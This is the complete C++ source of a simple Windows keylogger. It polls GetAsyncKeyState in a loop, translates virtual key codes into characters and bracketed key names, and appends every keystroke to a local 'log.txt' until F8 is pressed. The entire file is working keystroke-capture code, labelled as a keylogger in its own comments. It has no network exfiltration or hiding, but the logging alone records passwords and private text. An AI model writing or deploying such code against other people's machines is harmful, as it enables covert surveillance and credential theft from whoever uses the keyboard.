#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <assert.h>

int log_key(int key, const char* file) {
	std::cout << key << std::endl;
	//character maps for virtual keys to chars
	char keyMapUP[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	char keyMapLOW[] = "abcdefghijklmnopqrstuvwxyz";
	char numMap[] = "0123456789";
	FILE* theFile;
	errno_t error = fopen_s(&theFile, file, "a+");
	//fopen_s == 0 on success
	if (error == 0) {
		//key has not been pressed since last poll
		if (key == VK_BACK) {
			fprintf(theFile, " [BACK] ");
		}
		else if (key == VK_TAB) {
			fprintf(theFile, " [TAB] ");
		}
		else if (key == VK_SHIFT) {
			fprintf(theFile, " [SHIFT] ");
		}
		else if (key == VK_RETURN) {
			fprintf(theFile, "[ENTER] ");
		}
		else if (key == VK_ESCAPE) {
			fprintf(theFile, " [ESC] ");
		}
		else if (key == VK_SPACE) {
			fprintf(theFile, " [SPACEBAR] ");
		}
		else if (key > 64 && key < 91) {
			//key is A-Z or a-z
			if (GetKeyState(VK_CAPITAL) & 0x1) {
				//key is A-Z
				fprintf(theFile, "%c", keyMapUP[key % 65]);
			}
			else {
				//key is a-z
				fprintf(theFile, "%c", keyMapLOW[key % 65]);
			}
		}
		else if (key > 47 && key < 58) {
			//key is 0-9
			fprintf(theFile, "%c", numMap[key%48]);
		}
		else if (key > 95 && key < 106) {
			fprintf(theFile, "%c", numMap[key%96]);
		}
	}
	else {
		//error detected on fopen_s
		std::cout << "error opening file" << std::endl;
	}
	if (theFile) {
		error = fclose(theFile);
	}
	return 0;
}

int zero_array(int* array, int size) {
	for (int i = 0; i<size; i++) {
		array[i] = 0;
	}
	return 0;
}

int log_key(int key, char* file);
int zero_array(int* array, int size);

int main() {
	int active = 1;
	const int size = 256;
	int activityMap[size];
	zero_array(activityMap,size);
	while (active) {
		//poll every 50ms
		Sleep(50);
		for (int i = 8; i < 255; i++) {
			if (GetAsyncKeyState(i) & 0x8000) {
				//checks only if key is pressed down
				if (i == 119) {
					//F8 ends keylogger
					active = 0;
				}
				if (activityMap[i] == 0) {
					log_key(i, "log.txt");
				}
				activityMap[i] = 1;
			}
			else {
				//key not pressed, reset activity to 0
				activityMap[i] = 0;
			}
		}
	}
	return 0;
}